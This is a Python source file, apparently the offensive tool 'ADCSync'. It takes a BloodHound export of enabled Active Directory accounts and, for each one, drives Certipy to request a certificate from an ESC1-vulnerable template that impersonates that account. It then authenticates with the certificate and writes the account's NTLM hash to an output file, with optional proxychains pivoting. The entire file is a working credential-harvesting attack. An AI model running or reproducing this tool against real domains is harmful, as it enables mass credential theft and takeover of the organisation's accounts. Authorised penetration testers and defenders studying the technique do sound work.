import json
import os
import shutil
import subprocess
import logging
from tqdm import tqdm
from pyfiglet import Figlet
import argparse
from dataclasses import dataclass, field
from typing import List
from rich.logging import RichHandler

ascii_art = Figlet(font='slant')
print(ascii_art.renderText('ADCSync'))

# -------------------- FANCY LOGGING SETUP --------------------
LOG_FILE = "adcsync.log"

# Custom log format (File)
FILE_LOG_FORMAT = "%(asctime)s [%(levelname)s] - %(message)s"
DATE_FORMAT = "%Y-%m-%d %H:%M:%S"

# Custom log format (Console via RichHandler)
CONSOLE_LOG_FORMAT = "[%(levelname)s] - %(message)s"  # No timestamp

# Configure logging
logging.basicConfig(
    level=logging.DEBUG,  # Change to logging.INFO to reduce verbosity
    format=FILE_LOG_FORMAT,
    datefmt=DATE_FORMAT,
    handlers=[
        logging.FileHandler(LOG_FILE, mode="a"),  # File log (detailed)
        RichHandler(
            rich_tracebacks=True,
            markup=True,
            show_time=False,  # Remove timestamp from RichHandler
            show_level=True,  # Keep level names (INFO, SUCCESS, ERROR)
            show_path=False   # Hide file path details
        )
    ]
)

logger = logging.getLogger("ADCSync")

# Define a SUCCESS log level (Between INFO (20) and WARNING (30))
SUCCESS = 25
logging.addLevelName(SUCCESS, "SUCCESS")

def success(self, message, *args, **kwargs):
    if self.isEnabledFor(SUCCESS):
        self._log(SUCCESS, message, args, **kwargs)

logging.Logger.success = success  # Add method to Logger class

# Determine certipy client
certipy_client = shutil.which("certipy") or shutil.which("certipy-ad")
if not certipy_client:
    logger.error("❌ Certipy not found. Please install Certipy before running ADCSync.")
    exit(1)

@dataclass
class AccountInfo:
    spn: str
    domain: str
    sid: str
    username: str
    usernameLower: str
    pfx_filepath: str = ''

@dataclass
class AccountList:
    accounts: List[AccountInfo] = field(default_factory=list) # Ensure the list is initialized

# Create the "certificates" folder if it doesn't exist
certificates_folder = 'certificates'
if not os.path.exists(certificates_folder):
    os.makedirs(certificates_folder)

# Create the "caches" folder if it doesn't exist
caches_folder = 'caches'
if not os.path.exists(caches_folder):
    os.makedirs(caches_folder)

def get_json_data(json_file: str):
    """Load BloodHound JSON data."""
    if not os.path.exists(json_file):
        logger.error(f"❌ Error: File '{json_file}' not found.")
        exit(1)
    try:
        with open(json_file, 'r', encoding='utf-8') as file_obj:
            return json.load(file_obj)
    except json.JSONDecodeError:
        logger.error(f"❌ Error: The file '{json_file}' does not contain valid JSON.")
        exit(1)

def extract_accounts(data):
    """Extract accounts from JSON data."""
    accounts = AccountList()
    try:
        items = data.get('nodes', data.get('data', []))  # Try both structures
        for item in items:
            props = item.get('props') or item.get('Properties')  # Check both keys
            if props and props.get('enabled'):
                name = str(props.get('name', '')).lower()
                sid = props.get('objectid', '')
                baseDomainAD = str(props.get('domain', '')).lower()
                justUsernameLower = str(props.get('samaccountname', '')).lower()
                justUsername = props.get('samaccountname', '')
                accounts.accounts.append(
                    AccountInfo(spn=name, sid=sid, domain=baseDomainAD, username=justUsername, usernameLower=justUsernameLower)
                )
    except (IndexError, KeyError, TypeError) as e:
        logger.error(f"❌ Error extracting accounts: {e}")
        return accounts  # Return empty accounts list if an error occurs

    logger.success(f"✅ Found {len(accounts.accounts)} enabled accounts.")
    return accounts

def get_dc_netbios_from_fqdn(dc_fqdn: str) -> str:
    dc_netbios_domain = dc_fqdn.split('.')[0].lower()
    return dc_netbios_domain

def fetch_cert(account, ca_name, dc_ip, dc_fqdn, user, password, template, target, debug, proxychains):
    upn = f'{account.spn}'
    sid = account.sid
    dc_netbios_domain = get_dc_netbios_from_fqdn(dc_fqdn)
    pfx_file = f"{account.usernameLower}_{dc_netbios_domain}.pfx"
    pfx_filepath = os.path.join(certificates_folder, pfx_file)
    pfx_file_no_domain = f"{account.usernameLower}.pfx"
    pfx_file_no_domain_path = os.path.join(certificates_folder, pfx_file_no_domain)
    # Skip if the certificate file already exists
    if os.path.exists(pfx_file):
        if debug:
            logger.debug(f"skipping {upn}, pfx file already exists")
        account.pfx_filepath = pfx_file
        return account, None, None
    if os.path.exists(pfx_filepath):
        if debug:
            logger.debug(f"skipping {upn}, pfx file already exists")
        account.pfx_filepath = pfx_filepath
        return account, None, None
    if os.path.exists(pfx_file_no_domain_path):
        if debug:
            logger.debug(f"skipping {upn}, pfx file already exists")
        account.pfx_filepath = pfx_file_no_domain_path
        return account, None, None
    if proxychains:
        command = [
            'proxychains4', certipy_client, 'req', '-username', user, '-password', password, '-dc-ip', dc_ip, '-ca', ca_name, '-target', target,
                '-template', template, '-upn', upn, '-dns', dc_fqdn, '-sid', sid
        ]
    else:
        command = [
            certipy_client, 'req', '-username', user, '-password', password, '-dc-ip', dc_ip, '-ca', ca_name, '-target', target,
                '-template', template, '-upn', upn, '-sid', sid
        ]
    process = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    if "Failed to connect" in process.stdout:
        logger.error(f"⏳ Connection failed for account: {account.usernameLower}")
        return None

    # Move the generated .pfx file to the "certificates" folder if it exists
    for filename in os.listdir('.'):
        if filename.endswith('.pfx') and filename.startswith(account.usernameLower):
            destination = os.path.join(certificates_folder, filename)
            account.pfx_filepath = destination
            if debug:
                logger.debug(f"moving {destination} to {certificates_folder}!")
            shutil.move(filename, destination)

    return account, process.stdout.strip(), process.stderr.strip()

def auth_account(account, dc_ip, proxychains):
    if not account.pfx_filepath.endswith('.pfx'):
        return None
    if proxychains:
        command = f'echo 0 | proxychains4 {certipy_client} auth -pfx {account.pfx_filepath} -domain {account.domain} -dc-ip {dc_ip}'
    else:
        command = f'echo 0 | {certipy_client} auth -pfx {account.pfx_filepath} -domain {account.domain} -dc-ip {dc_ip}'

    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, shell=True)
    stdout, stderr = process.communicate()
    if "Got error" in stdout:
        logger.error(f"❌ Error: Failed to authenticate for {account.username}: {stdout}")
    if "Got error" in stderr:
        logger.error(f"❌ Error: Failed to authenticate for {account.username}: {stderr}")
    return account, stdout.strip(), stderr.strip()

def process_certipy_auth(account, stdout, output):
    with open(output, 'a') as out_file:
        if stdout:
            try:
                ntlm_hash = stdout.split('\n')[-1].split(': ')[1]
                out_file.write(f'{account.domain}\\{account.username}::{ntlm_hash}::: (status=Enabled)\n')
                logger.success(f"🔑 Successfully authenticated {account.username} - NTLM Hash stored")
            except IndexError:
                logger.error(f"❌ Error: Failed to parse NTLM hash for {account.username}: {stdout}")
    # Move the .ccache file to the "caches" folder if it exists
    ccache_file = f'{account.usernameLower}.ccache'
    if os.path.exists(ccache_file):
        shutil.move(ccache_file, os.path.join(caches_folder, ccache_file))

def main(file, output, ca_name, dc_ip, dc_fqdn, user, password, template, target, debug, proxychains):
    data = get_json_data(file)
    accounts = extract_accounts(data)

    for account in tqdm(accounts.accounts, total=len(accounts.accounts), desc="ADCSync ESC1"):
        # Execute certipy req command for each name
        req_account, stdout, stderr = fetch_cert(account, ca_name, dc_ip, dc_fqdn, user, password, template, target, debug, proxychains)
        if debug:
            logger.debug(stdout)
            logger.debug(stderr)

        # Certipy auth command for account
        authed_account, auth_stdout, auth_stderr = auth_account(req_account, dc_ip, proxychains)
        if debug:
            logger.debug(auth_stdout)
            logger.debug(auth_stderr)
        # Process certipy auth stdout and write to file
        process_certipy_auth(authed_account, auth_stdout, output)

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="Retrieve NTLM hashes via ADCS ESC1 technique.")
    parser.add_argument('-f', '--file', help='Input User List JSON file from Bloodhound', required=True)
    parser.add_argument('-o', '--output', help='NTLM Hash Output file', required=True)
    parser.add_argument('-ca-name', help='Certificate Authority', required=True)
    parser.add_argument('-dc-ip', help='IP Address of Domain Controller', required=True)
    parser.add_argument('-dc-fqdn', help='FQDN of Domain Controller', required=True)
    parser.add_argument('-u', '--user', help='Username', required=True)
    parser.add_argument('-p', '--password', help='Password', required=True)
    parser.add_argument('-template', help='Template Name vulnerable to ESC1', required=True)
    parser.add_argument('-target', help='CA FQDN', required=True)
    parser.add_argument('-debug', action='store_true', help='Show verbose debugging information')
    parser.add_argument('-proxychains', action='store_true', help='Use proxychains4')

    args = parser.parse_args()
    main(args.file, args.output, args.ca_name, args.dc_ip, args.dc_fqdn, args.user, args.password, args.template, args.target, args.debug, args.proxychains)
